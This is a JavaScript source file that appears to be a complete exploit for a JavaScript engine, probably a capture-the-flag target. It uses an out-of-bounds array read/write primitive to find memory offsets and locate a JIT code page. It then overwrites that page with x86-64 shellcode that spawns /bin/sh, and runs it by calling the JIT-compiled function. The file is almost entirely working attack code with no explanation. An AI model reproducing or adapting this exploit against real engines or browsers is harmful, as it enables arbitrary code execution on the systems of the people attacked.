function dtoi(d) {
    const i = new Uint32Array(new Float64Array([d]).buffer);
    return [i[1], i[0]];
}

function itod(i) {
    return new Float64Array(new Uint32Array([i[1], i[0]]).buffer)[0];
}

function hex(i) {
    const v0 = ("00000000" + i[1].toString(16)).substr(-8);
    const v1 = ("00000000" + i[0].toString(16)).substr(-8);
    return "0x" + v1 + v0;
}

function unhex(h) {
    const i0 = parseInt(h.substr(10, 8), 16);
    const i1 = parseInt(h.substr(2, 8), 16);
    return [i1, i0];
}

function shell() {
    version();
}

oob_arr = [0x1111];
arr = [0xdeadbeef];

oob_arr.pop();
oob_arr.pop();

print(oob_arr.length);

arr_offset = 0;
for(let i = 0; i < 0x100; i++) {
    if(hex(dtoi(oob_arr[i])) == "0x41ebd5b7dde00000") { // double(0xdeadbeef)
        arr_offset = i-3;
        print("[+] Arr Offset Found: " + arr_offset + " " + hex(dtoi(oob_arr[arr_offset])));
        break;
    }
}

for(let i = 0; i < 20; i++) {
    shell();
}

jitaddr_offset = 0;
for(let i = 0; i < 0x10000; i++) {
    if(hex(dtoi(oob_arr[i])) == "0x0000015000000161") {
        jitaddr_offset = i-2;
        print("[+] JIT Addr Offset Found: " + jitaddr_offset + " " + hex(dtoi(oob_arr[jitaddr_offset])));
        break;
    }
}

function write8(addr, value) {
    oob_arr[arr_offset] = itod(addr);
    arr[0] = itod(value);
}

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

while(shellcode.length % 8)
    shellcode += "\x90"

addr = dtoi(oob_arr[jitaddr_offset]);

for(let i = 0; i < shellcode.length; i+=8) {
    let sc_block = "0x";
    for(let j = 7; j >= 0; j--) {
        sc_block += ("00" + shellcode.charCodeAt(i+j).toString(16)).substr(-2);
    }
    
    write8(addr, unhex(sc_block));
    addr[1] += 8;
}

shell();

//Math.atan(a);
